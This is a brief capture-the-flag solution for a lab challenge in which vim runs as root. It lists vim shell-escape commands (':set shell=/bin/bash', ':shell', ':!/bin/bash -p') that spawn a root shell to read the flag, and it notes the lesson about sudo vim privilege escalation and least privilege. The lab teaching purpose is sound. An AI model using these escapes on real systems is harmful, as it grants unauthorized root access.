### Vim Escape - Editor Is Root

The complaint box runs `vim` as root on `/challenge/note.txt`. Editors are programs. Programs with root can be escaped.

```bash
/challenge/vim-run
```

Inside vim:
```
:set shell=/bin/bash
:shell
cat /flag
```

Or `:!/bin/bash -p` then `cat /flag`. If `-p` confuses you, read `man bash` + `man vim`.

Solve: vim `:shell` spawns root shell because parent was setuid-root. Talk point: `$EDITOR`, `sudo vim` privesc, least privilege.
